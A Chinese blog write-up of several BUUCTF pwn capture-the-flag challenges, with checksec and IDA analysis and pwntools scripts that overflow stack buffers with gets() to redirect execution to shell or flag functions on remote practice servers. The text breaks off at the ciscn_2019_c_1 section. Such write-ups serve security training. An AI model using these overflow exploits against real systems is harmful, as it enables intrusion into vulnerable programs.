---
title: BUUCTF[Pwn]
author: Stan
date: 2020-09-17 19:00:33 +0800
categories: [CTF,BUUCTF]
tags: [Pwn]
---
## test_your_nc
```
nc node3.buuoj.cn 25795
```

![2020-09-17_13-42-26](https://i.loli.net/2020/09/18/NACD2xQiStRhu5T.png)

直接nc过去，ls即可看到文件，发现flag，cat即可发现flag

```
cat flag
```

---

## rip

先`checksec`，发现保护都没开

![2020-09-17_15-09-45](https://i.loli.net/2020/09/19/LdE5bpzWK9lyCAt.png)

打开`IDA64`

搜索字符串，发现**/bin/sh**

查交叉引用，最后发现这里![2020-09-17_19-15-52](https://i.loli.net/2020/09/19/bW4emScKthifgJR.png)

system也有了，根据题目名字，只要栈溢出，rip覆盖成40118A就行了

![image-20200917192213258](https://i.loli.net/2020/09/19/jFzIb1xnsef5k3J.png)

很明显gets函数没有限制输入，存在溢出点

![image-20200917192549256](https://i.loli.net/2020/09/19/di3Ojf5xtwm1yCg.png)

之后查看栈，发现只要覆盖15+8就可以了

之后写Exploit

````python
from pwn import *

a=process('./pwn1')

a.recvuntil("please input")

a.sendline(b"a" * 23 + p64(0x40118A))

a.interactive()
````

这是本地调试，非常成功，但是跑remote会无反应

怀疑是服务器文件和下发的文件不同，需要猜测代码

先nc过去查看程序逻辑

应该就是把puts和gets的位置反了一下，调整一下exp

````python
from pwn import *

a=remote('node3.buuoj.cn',27250)

a.sendline(b"a" * 23 + p64(0x40118A))

a.interactive()
````

因为顺序反了，所以直接send就行

得到flag

---

## warmup_csaw_2016

先`checksec`

![image-20200919124407183](https://i.loli.net/2020/09/19/USwa9vEypzTxtk5.png)

无保护

用`IDA64`打开，看到了敏感函数

![image-20200919124759965](https://i.loli.net/2020/09/19/BXWJ1R9FwDe35qt.png)

为了方便直接用`gdb`

先**pattern create**创建垃圾字符，然后**run**运行，等到gets函数的时候粘贴垃圾字符

![image-20200919125221996](https://i.loli.net/2020/09/19/YLRwfglMHPIeV9U.png)

得到偏移(offset)值为72

![image-20200919125425197](https://i.loli.net/2020/09/19/EpVG9CM5m8ZWIqF.png)

之后写exploit

最开始敏感函数的位置是0000000000400611

````python
from pwn import *

a=remote("node3.buuoj.cn",26276)

#a=process("./warmup_csaw_2016")

a.sendline(b"a" * 72 + p64(0x400611))

a.interactive()
````

本地调试的时候因为无法cat flag.txt，所以会报错，直接remote就可以了

![image-20200919130030639](https://i.loli.net/2020/09/19/rOnN9a4wkcJoezY.png)

得到flag

---

## pwn1_sctf_2016

日常`checksec`

![image-20200919131722183](https://i.loli.net/2020/09/19/woVXPu8Cn7mzvZB.png)

发现开启了NX，也就是堆栈不可执行

拉进`ida32`，找到了敏感函数

![image-20200919141653100](https://i.loli.net/2020/09/19/2GgSEzoH3uJlkMx.png)

vul函数中，溢出点应该是fgets，要覆盖60+4位，但是长度限制32

中间一大段看不懂，尝试了一下

![image-20200919142145602](https://i.loli.net/2020/09/19/v9Kyrwn6NbxRzhP.png)

把I替换成了you，也就是说能够用64/3=21个I+64 mod 3=1个其余垃圾字符来溢出

开始写Exploit

````python
from pwn import *

a=remote('node3.buuoj.cn',27812)

#a=process("./pwn1_sctf_2016")

a.sendline(b"I" * 20+ b"a"*4 + p32(0x8048F13))

a.interactive()
````

![image-20200919214922369](https://i.loli.net/2020/09/19/uHvlIpQYEf6BTc3.png)

发现flag

---

## ciscn_2019_n_1

日常`checksec`

![image-20200919215440393](https://i.loli.net/2020/09/19/a6ebU4omWKGMhND.png)

64位且开启了NX

打开`IDA64`,发现敏感函数

![image-20200919215616095](https://i.loli.net/2020/09/19/VM9H247KnmWBG5u.png)

查看代码，发现gets可以溢出

![image-20200919221158798](https://i.loli.net/2020/09/19/AR2MeicndpQEfyU.png)

写exp

````python
from pwn import *
a=remote('node3.buuoj.cn',28471)

#a=process("./ciscn_2019_n_1")

a.recvuntil(".")

a.sendline(b"a" * 56 + p64(0x4006BE))

a.interactive()
````

当然还有其他解法，就是顺着程序，让v2=11.28125

````python
from pwn import *

r=remote('node3.buuoj.cn',28471)

r.sendline('a'*0x2c+p64(0x41348000))

r.interactive()
````

两种方法都可以发现flag

![image-20200919221108810](https://i.loli.net/2020/09/19/hD2J9NrlQBkIAgV.png)

---

## ciscn_2019_c_1

日常`checksec`

![image-20200919215440393](https://i.loli.net/2020/09/19/a6ebU4omWKGMhND.png)

只开了NX

用`IDA`打开，在encrypt函数中找到了溢出点gets

![image-20200920230148555](https://i.loli.net/2020/09/20/623WaEnSmQdZxK5.png)

没有后门函数，要自己泄露libc进行rop